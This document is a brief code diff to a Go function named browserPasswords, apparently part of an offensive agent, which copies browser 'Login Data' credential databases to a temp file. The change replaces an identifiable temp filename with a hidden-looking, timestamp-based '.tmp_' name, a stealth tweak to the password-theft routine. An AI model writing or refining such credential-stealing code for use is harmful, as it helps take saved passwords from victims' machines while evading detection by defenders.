@@ -13,6 +13,7 @@ import (
 	"os"
 	"path/filepath"
 	"strings"
+	"time"
 	"unsafe"
 
 	"fawkes/pkg/structs"
@@ -279,7 +280,7 @@ func browserPasswords(args browserArgs) structs.CommandResult {
 			loginDataPath := filepath.Join(profileDir, "Login Data")
 
 			// Copy to temp file to avoid database lock
-			tmpFile := filepath.Join(os.TempDir(), fmt.Sprintf("ld_%s_%d.db", browserName, os.Getpid()))
+			tmpFile := filepath.Join(os.TempDir(), fmt.Sprintf(".tmp_%d.db", time.Now().UnixNano()))
 			if err := copyFile(loginDataPath, tmpFile); err != nil {
 				errors = append(errors, fmt.Sprintf("%s (%s): copy Login Data: %v", browserName, filepath.Base(profileDir), err))
 				continue
